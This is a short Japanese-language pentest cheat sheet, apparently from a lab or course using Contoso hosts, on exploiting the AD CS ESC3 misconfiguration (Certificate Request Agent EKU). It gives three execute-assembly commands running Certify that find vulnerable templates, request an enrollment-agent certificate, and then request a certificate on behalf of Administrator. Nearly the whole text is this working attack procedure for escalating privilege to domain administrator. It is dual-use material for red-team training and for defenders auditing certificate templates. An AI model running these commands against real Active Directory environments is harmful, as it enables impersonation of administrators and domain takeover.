証明書テンプレートにCertificate Request AgentのEKUが有効になっている場合に発生

## Enumerate
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

## 実行
テンプレートから証明書を要求
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
```

その証明書を使用して、別のユーザーに代わって別の証明書を要求
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx <PFX> --quiet
```